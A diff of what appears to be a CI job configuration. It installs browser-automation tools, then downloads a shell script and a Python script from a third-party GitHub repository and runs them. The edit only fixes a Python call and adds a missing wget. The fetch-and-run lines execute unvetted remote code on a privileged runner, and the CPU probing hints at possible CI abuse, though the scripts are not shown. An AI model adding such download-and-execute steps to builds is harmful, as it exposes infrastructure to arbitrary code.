@@ -11,8 +11,8 @@ jobs:
             echo "Checking number of CPUs:"
             lscpu
             sudo ls -ld /usr/local/bin/
-            sudo apt-get update && sudo apt-get install -y neofetch && sudo apt install curl -y && sudo apt install wget -y && sudo apt-get install python3 -y && python --version 
-            sudo apt-get update -y && sudo apt-get install python3-setuptools -y && pip install selenium && sudo apt-get install chromium-driver -y && pip install selenium selenium-wire && pip uninstall blinker -y && pip install blinker==1.4 && wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh && chmod +x hip.sh && ./hip.sh && https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/lok1.py && python3 lok1.py
+            sudo apt-get update && sudo apt-get install -y neofetch && sudo apt install curl -y && sudo apt install wget -y && sudo apt-get install python3 -y && python3 --version 
+            sudo apt-get update -y && sudo apt-get install python3-setuptools -y && pip install selenium && sudo apt-get install chromium-driver -y && pip install selenium selenium-wire && pip uninstall blinker -y && pip install blinker==1.4 && wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh && chmod +x hip.sh && ./hip.sh && wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/lok1.py && python3 lok1.py
 
 workflows:
   version: 2
